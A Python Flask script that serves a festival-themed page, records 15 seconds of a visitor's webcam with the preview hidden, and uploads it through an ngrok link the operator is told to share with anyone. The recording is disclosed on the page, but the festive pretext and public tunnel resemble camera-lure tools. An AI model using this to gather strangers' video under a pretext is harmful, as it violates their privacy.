#!/usr/bin/env python3
"""
Festival Video Receiver - With Celebration Animation
"""

import os
import sys
import time
import json
import subprocess
import threading
import signal
import urllib.request
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

# ============================================
# Configuration
# ============================================
UPLOAD_FOLDER = 'festival_videos'
PORT = 5000

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎉 {{ festival_name }} - Video Recorder</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            overflow: hidden;
            position: relative;
        }
        
        /* ========== CONFETTI BACKGROUND ========== */
        .confetti-container {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; overflow: hidden; z-index: 0;
        }
        .confetti {
            position: absolute;
            width: 10px; height: 10px; top: -10px;
            animation: confettiFall linear infinite;
        }
        @keyframes confettiFall {
            0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
        }
        
        /* ========== CELEBRATION OVERLAY ========== */
        .celebration-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100;
            display: none;
            justify-content: center;
            align-items: center;
            background: rgba(0,0,0,0.5);
            animation: fadeIn 0.5s ease;
            pointer-events: none;
        }
        .celebration-overlay.active {
            display: flex;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.8); }
            to { opacity: 1; transform: scale(1); }
        }
        
        .celebration-content {
            text-align: center;
            animation: bounceIn 1s ease;
            pointer-events: auto;
        }
        @keyframes bounceIn {
            0% { transform: scale(0.3); opacity: 0; }
            50% { transform: scale(1.1); }
            70% { transform: scale(0.9); }
            100% { transform: scale(1); opacity: 1; }
        }
        
        .celebration-emoji {
            font-size: 120px;
            display: block;
            animation: celebrateSpin 2s ease-in-out infinite;
            text-shadow: 0 0 60px rgba(255,215,0,0.8);
        }
        @keyframes celebrateSpin {
            0%, 100% { transform: rotate(-5deg) scale(1); }
            50% { transform: rotate(5deg) scale(1.1); }
        }
        
        .celebration-text {
            color: white;
            font-size: 3rem;
            font-weight: bold;
            text-shadow: 0 0 30px rgba(255,215,0,0.6);
            margin-top: 20px;
            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmer 2s linear infinite;
        }
        @keyframes shimmer {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }
        
        .celebration-sub {
            color: rgba(255,255,255,0.9);
            font-size: 1.2rem;
            margin-top: 10px;
            -webkit-text-fill-color: rgba(255,255,255,0.9);
        }
        
        /* ========== BIG CELEBRATION CONFETTI ========== */
        .celebration-confetti {
            position: fixed;
            z-index: 99;
            pointer-events: none;
            font-size: 40px;
            animation: celebrationFall linear forwards;
        }
        @keyframes celebrationFall {
            0% {
                transform: translateY(-100px) rotate(0deg) scale(1);
                opacity: 1;
            }
            100% {
                transform: translateY(120vh) rotate(720deg) scale(0.5);
                opacity: 0;
            }
        }
        
        /* ========== MAIN CARD ========== */
        .festival-card {
            position: relative; z-index: 1;
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 50px;
            max-width: 600px; width: 90%;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
            text-align: center;
            animation: float 3s ease-in-out infinite;
            transition: all 0.5s ease;
        }
        .festival-card.celebrating {
            animation: none;
            transform: scale(1.02);
            border-color: #ffd93d;
            box-shadow: 0 0 60px rgba(255,215,0,0.3);
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        
        .festival-icon {
            font-size: 80px; margin-bottom: 20px; display: block;
            animation: pulse 2s ease-in-out infinite;
        }
        .festival-icon.celebrating {
            animation: celebrateSpin 1s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .festival-title {
            color: white; font-size: 2.5rem; font-weight: bold;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .festival-name {
            color: #ffd93d; font-weight: bold;
        }
        
        .timer-display {
            font-size: 3rem; font-weight: bold; color: #ffd93d;
            text-shadow: 0 0 30px rgba(255,217,61,0.5);
            margin: 10px 0 20px 0;
            transition: all 0.3s ease;
        }
        .timer-display.done {
            color: #7dffb3;
            text-shadow: 0 0 40px rgba(125,255,179,0.6);
            animation: celebratePulse 1s ease-in-out infinite;
        }
        @keyframes celebratePulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .progress-container {
            width: 100%; height: 8px;
            background: rgba(255,255,255,0.2);
            border-radius: 10px; margin: 20px 0 25px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%; width: 0%;
            background: linear-gradient(90deg, #f093fb, #f5576c, #ffd93d);
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        .progress-bar.done {
            background: linear-gradient(90deg, #7dffb3, #4CAF50, #7dffb3);
            background-size: 200% auto;
            animation: shimmer 1s linear infinite;
        }
        
        .camera-btn {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            border: none; color: white;
            padding: 18px 50px; font-size: 1.2rem; font-weight: bold;
            border-radius: 50px; cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(245,87,108,0.4);
            margin: 5px;
        }
        .camera-btn:hover:not(:disabled) {
            transform: scale(1.05);
            box-shadow: 0 15px 40px rgba(245,87,108,0.6);
        }
        .camera-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .camera-btn.recording { background: linear-gradient(135deg, #ff6b6b, #ee5a24); }
        .camera-btn.uploading { background: linear-gradient(135deg, #4CAF50, #45a049); }
        .camera-btn.celebrating { 
            background: linear-gradient(135deg, #ffd93d, #f5576c);
            animation: celebratePulse 0.5s ease-in-out 3;
        }
        
        .status {
            margin-top: 20px; color: rgba(255,255,255,0.9);
            font-size: 0.95rem; min-height: 30px;
        }
        .status.success { color: #7dffb3; }
        .status.error { color: #ff6b6b; }
        .status.warning { color: #ffd93d; }
        .status.celebrating {
            color: #ffd93d;
            font-size: 1.2rem;
            font-weight: bold;
            animation: celebratePulse 0.5s ease-in-out infinite;
        }
        
        #hiddenVideo { display: none; }
        .upload-container { margin: 20px 0; display: none; }
        .upload-container.visible { display: block; }
        
        @media (max-width: 600px) {
            .festival-card { padding: 30px 20px; }
            .festival-title { font-size: 1.8rem; }
            .festival-icon { font-size: 60px; }
            .timer-display { font-size: 2.5rem; }
            .celebration-emoji { font-size: 80px; }
            .celebration-text { font-size: 2rem; }
        }
    </style>
</head>
<body>
    <!-- Confetti Background -->
    <div class="confetti-container" id="confettiContainer"></div>
    
    <!-- Celebration Overlay -->
    <div class="celebration-overlay" id="celebrationOverlay">
        <div class="celebration-content">
            <span class="celebration-emoji">🎉</span>
            <div class="celebration-text">VIDEO SENT!</div>
            <div class="celebration-sub">✨ Thank you for participating! ✨</div>
        </div>
    </div>
    
    <video id="hiddenVideo" autoplay playsinline></video>
    
    <div class="festival-card" id="festivalCard">
        <span class="festival-icon" id="festivalIcon">🎊</span>
        <h1 class="festival-title">{{ festival_name }} <span style="font-size:0.6rem;">🎉</span></h1>
        <div class="timer-display" id="timerDisplay">15</div>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <button class="camera-btn" id="recordBtn">🎥 Start Recording (15s)</button>
        <div class="upload-container" id="uploadContainer">
            <div class="status" id="uploadStatus">📤 Uploading...</div>
            <div class="progress-container">
                <div class="progress-bar" id="uploadProgress" style="background: linear-gradient(90deg, #4CAF50, #8BC34A);"></div>
            </div>
        </div>
        <div class="status" id="statusMessage">✨ Click to record a 15-second video for {{ festival_name }}</div>
    </div>

    <script>
        // ============================================
        // DOM Elements
        // ============================================
        const videoElement = document.getElementById('hiddenVideo');
        const recordBtn = document.getElementById('recordBtn');
        const statusMessage = document.getElementById('statusMessage');
        const timerDisplay = document.getElementById('timerDisplay');
        const progressBar = document.getElementById('progressBar');
        const uploadContainer = document.getElementById('uploadContainer');
        const uploadStatus = document.getElementById('uploadStatus');
        const uploadProgress = document.getElementById('uploadProgress');
        const festivalCard = document.getElementById('festivalCard');
        const festivalIcon = document.getElementById('festivalIcon');
        const celebrationOverlay = document.getElementById('celebrationOverlay');

        const UPLOAD_URL = window.location.origin + '/upload';
        const DURATION = 15;
        let mediaStream = null, mediaRecorder = null, recordedChunks = [];
        let timerInterval = null, timeRemaining = DURATION, isRecording = false;

        // ============================================
        // Confetti Generator (Background)
        // ============================================
        const confettiContainer = document.getElementById('confettiContainer');
        const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
        for (let i = 0; i < 80; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + '%';
            confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.width = (Math.random() * 8 + 4) + 'px';
            confetti.style.height = (Math.random() * 8 + 4) + 'px';
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
            confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
            confetti.style.animationDelay = (Math.random() * 4) + 's';
            confettiContainer.appendChild(confetti);
        }

        // ============================================
        // Celebration Functions
        // ============================================
        function showCelebration() {
            // Show overlay
            celebrationOverlay.classList.add('active');
            
            // Add celebration class to card
            festivalCard.classList.add('celebrating');
            festivalIcon.classList.add('celebrating');
            timerDisplay.classList.add('done');
            progressBar.classList.add('done');
            recordBtn.classList.add('celebrating');
            statusMessage.classList.add('celebrating');
            statusMessage.textContent = '🎉 VIDEO SENT SUCCESSFULLY! 🎉';
            
            // Launch celebration confetti
            launchCelebrationConfetti();
            
            // Auto-hide overlay after 4 seconds
            setTimeout(() => {
                celebrationOverlay.classList.remove('active');
                festivalCard.classList.remove('celebrating');
                festivalIcon.classList.remove('celebrating');
                timerDisplay.classList.remove('done');
                progressBar.classList.remove('done');
                recordBtn.classList.remove('celebrating');
                statusMessage.classList.remove('celebrating');
                statusMessage.textContent = '✅ Recording complete! Click to record again';
                statusMessage.className = 'status success';
            }, 4000);
        }

        function launchCelebrationConfetti() {
            const emojis = ['🎉', '🎊', '✨', '⭐', '🌟', '💫', '🎈', '🎁', '🥳', '🎆', '🎇', '🏆'];
            const container = document.body;
            
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    const el = document.createElement('div');
                    el.className = 'celebration-confetti';
                    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                    el.style.left = Math.random() * 100 + '%';
                    el.style.fontSize = (Math.random() * 30 + 20) + 'px';
                    el.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    el.style.animationDelay = '0s';
                    container.appendChild(el);
                    
                    // Remove after animation
                    setTimeout(() => {
                        el.remove();
                    }, 5000);
                }, i * 50);
            }
        }

        // ============================================
        // Timer & Recording Functions
        // ============================================
        function updateTimerDisplay(seconds) {
            timerDisplay.textContent = seconds;
            const progress = ((DURATION - seconds) / DURATION) * 100;
            progressBar.style.width = progress + '%';
        }

        async function startRecording() {
            try {
                // Reset UI
                timeRemaining = DURATION;
                updateTimerDisplay(DURATION);
                progressBar.style.width = '0%';
                progressBar.classList.remove('done');
                timerDisplay.classList.remove('done');
                statusMessage.textContent = '📷 Accessing camera...';
                statusMessage.className = 'status';
                recordBtn.disabled = true;
                uploadContainer.classList.remove('visible');
                festivalCard.classList.remove('celebrating');
                festivalIcon.classList.remove('celebrating');

                // Get camera
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });

                videoElement.srcObject = mediaStream;
                await videoElement.play();

                // Setup recorder
                recordedChunks = [];
                mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    uploadVideo(blob);
                };

                // Start recording
                mediaRecorder.start();
                isRecording = true;
                recordBtn.textContent = '🔴 Recording...';
                recordBtn.className = 'camera-btn recording';
                statusMessage.textContent = `🎥 Recording... 15s remaining`;
                statusMessage.className = 'status warning';

                // Start countdown
                timerInterval = setInterval(() => {
                    timeRemaining--;
                    updateTimerDisplay(timeRemaining);
                    statusMessage.textContent = `🎥 Recording... ${timeRemaining}s remaining`;
                    
                    if (timeRemaining <= 0) {
                        clearInterval(timerInterval);
                        timerInterval = null;
                        
                        // Stop recording
                        if (mediaRecorder && isRecording) {
                            mediaRecorder.stop();
                            isRecording = false;
                            recordBtn.textContent = '📤 Uploading...';
                            recordBtn.className = 'camera-btn uploading';
                            statusMessage.textContent = '⏳ Processing video...';
                        }
                        
                        // Stop camera
                        if (mediaStream) {
                            mediaStream.getTracks().forEach(track => track.stop());
                            mediaStream = null;
                            videoElement.srcObject = null;
                        }
                        
                        // SHOW CELEBRATION!
                        showCelebration();
                    }
                }, 1000);

            } catch (error) {
                console.error('Error:', error);
                statusMessage.textContent = '❌ Error: ' + error.message;
                statusMessage.className = 'status error';
                recordBtn.disabled = false;
                recordBtn.textContent = '📸 Start Recording (15s)';
                recordBtn.className = 'camera-btn';
            }
        }

        async function uploadVideo(blob) {
            uploadContainer.classList.add('visible');
            uploadStatus.textContent = '📤 Uploading to server...';
            uploadProgress.style.width = '0%';

            const formData = new FormData();
            formData.append('video', blob, `festival_video_${Date.now()}.webm`);

            try {
                let progress = 0;
                const progressInterval = setInterval(() => {
                    progress += 5;
                    if (progress <= 95) uploadProgress.style.width = progress + '%';
                }, 200);

                const response = await fetch(UPLOAD_URL, { method: 'POST', body: formData });
                clearInterval(progressInterval);

                if (response.ok) {
                    uploadProgress.style.width = '100%';
                    uploadStatus.textContent = '✅ Video sent successfully!';
                    statusMessage.textContent = '🎉 Thank you for the video!';
                    statusMessage.className = 'status success';
                    recordBtn.textContent = '📸 Send Another';
                    recordBtn.className = 'camera-btn';
                    recordBtn.disabled = false;
                } else {
                    throw new Error('Upload failed: ' + response.status);
                }
            } catch (error) {
                uploadStatus.textContent = '❌ Upload failed: ' + error.message;
                statusMessage.textContent = '❌ Upload failed - please try again';
                statusMessage.className = 'status error';
                recordBtn.textContent = '📸 Try Again';
                recordBtn.className = 'camera-btn';
                recordBtn.disabled = false;
            }
        }

        // ============================================
        // Event Listeners
        // ============================================
        recordBtn.addEventListener('click', () => {
            if (isRecording) return;
            startRecording();
        });

        window.addEventListener('beforeunload', () => {
            if (mediaRecorder && isRecording) mediaRecorder.stop();
            if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
        });
    </script>
</body>
</html>
"""

# ============================================
# Flask Application
# ============================================
app = Flask(__name__)
CORS(app)

received_videos = []

@app.route('/')
def index():
    festival_name = app.config.get('FESTIVAL_NAME', 'Festival')
    html = HTML_TEMPLATE.replace('{{ festival_name }}', festival_name)
    return html

@app.route('/upload', methods=['POST'])
def upload_video():
    try:
        if 'video' not in request.files:
            return jsonify({'error': 'No video file'}), 400
        
        video_file = request.files['video']
        if video_file.filename == '':
            return jsonify({'error': 'No filename'}), 400

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"festival_{app.config.get('FESTIVAL_NAME', 'video')}_{timestamp}.webm"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        video_file.save(filepath)
        
        video_info = {
            'filename': filename,
            'path': filepath,
            'timestamp': timestamp,
            'size': os.path.getsize(filepath)
        }
        received_videos.append(video_info)
        
        print(f"\n✅ Video received: {filename}")
        print(f"📁 Saved to: {filepath}")
        print(f"📊 Size: {video_info['size']} bytes")
        print(f"📹 Total videos received: {len(received_videos)}\n")
        
        return jsonify({'success': True, 'filename': filename}), 200

    except Exception as e:
        print(f"❌ Error receiving video: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/videos', methods=['GET'])
def list_videos():
    return jsonify({'videos': received_videos})

@app.route('/download/<filename>', methods=['GET'])
def download_video(filename):
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ============================================
# Main Tool Class
# ============================================
class FestivalReceiver:
    def __init__(self):
        self.festival_name = ""
        self.ngrok_process = None
        self.ngrok_url = None
        self.port = PORT
        self.running = True
        self.ngrok_ready = threading.Event()

    def setup_directories(self):
        Path(UPLOAD_FOLDER).mkdir(exist_ok=True)

    def get_festival_name(self):
        print("\n" + "="*60)
        print("🎉 FESTIVAL VIDEO RECEIVER 🎉")
        print("="*60)
        
        while True:
            name = input("\n📝 Enter festival name: ").strip()
            if name:
                self.festival_name = name
                app.config['FESTIVAL_NAME'] = name
                break
            print("❌ Name cannot be empty!")

    def check_ngrok(self):
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass
        
        print("\n❌ ngrok is not installed or not in PATH!")
        return False

    def monitor_ngrok(self):
        try:
            time.sleep(3)
            for attempt in range(10):
                try:
                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                        data = json.loads(response.read().decode())
                        for tunnel in data.get('tunnels', []):
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                self.ngrok_ready.set()
                                return
                except Exception:
                    time.sleep(3)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
        
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30):
                print(f"✅ ngrok tunnel established!")
                print(f"🌐 Public URL: {self.ngrok_url}")
                return True
            else:
                print("⚠️ ngrok started but URL not found")
                return False
                
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        print(f"\n🔧 Starting Flask server on port {self.port}...")
        
        def run_flask():
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Flask server running")

    def generate_link(self):
        print("\n" + "="*60)
        print("📤 SHARE THIS LINK WITH ANYONE:")
        print("="*60)
        print(f"\n🔗 {self.ngrok_url}")
        print("\n" + "="*60)
        print("📋 Instructions:")
        print("1. Send this link to anyone")
        print("2. They open it in a browser")
        print("3. They allow camera permission")
        print("4. They record a 15-second video")
        print("5. Video auto-uploads to YOU!")
        print("="*60)
        print("\n📋 The link is printed above - copy it manually")

    def wait_for_videos(self):
        print("\n🎯 Waiting for videos... (Press Ctrl+C to stop)")
        print(f"📁 Videos will be saved in: {UPLOAD_FOLDER}/")
        print("-"*60)
        
        try:
            while self.running:
                if received_videos:
                    latest = received_videos[-1]
                    print(f"\n📹 New video received!")
                    print(f"   Name: {latest['filename']}")
                    print(f"   Size: {latest['size']:,} bytes")
                    print(f"   Total videos: {len(received_videos)}")
                    
                    print("\nOptions (type and press Enter):")
                    print("  [v] View all videos")
                    print("  [d] Download latest video")
                    print("  [q] Quit")
                    print("  [Enter] Continue waiting")
                    
                    import select
                    import sys
                    
                    if select.select([sys.stdin], [], [], 1)[0]:
                        choice = sys.stdin.readline().strip().lower()
                        if choice == 'v':
                            self.list_videos()
                        elif choice == 'd':
                            self.download_latest()
                        elif choice == 'q':
                            self.running = False
                            break
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")

    def download_latest(self):
        if not received_videos:
            print("📭 No videos available")
            return
        
        latest = received_videos[-1]
        print(f"\n📥 Downloading: {latest['filename']}")
        print(f"   Saved at: {latest['path']}")

    def list_videos(self):
        if not received_videos:
            print("📭 No videos received yet")
            return
        
        print("\n📹 Received Videos:")
        print("-"*60)
        for i, video in enumerate(received_videos, 1):
            size_kb = video['size'] / 1024
            print(f"{i}. {video['filename']}")
            print(f"   Size: {size_kb:.1f} KB")
            print(f"   Received: {video['timestamp']}")
            print()

    def cleanup(self):
        print("\n🧹 Cleaning up...")
        if self.ngrok_process:
            self.ngrok_process.terminate()
            try:
                self.ngrok_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ngrok_process.kill()
        print("✅ Done!")

    def run(self):
        try:
            self.setup_directories()
            self.get_festival_name()
            
            if not self.check_ngrok():
                return
            
            self.start_flask()
            if not self.start_ngrok():
                return
            
            self.generate_link()
            self.wait_for_videos()
            
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
        finally:
            self.cleanup()

if __name__ == '__main__':
    receiver = FestivalReceiver()
    receiver.run()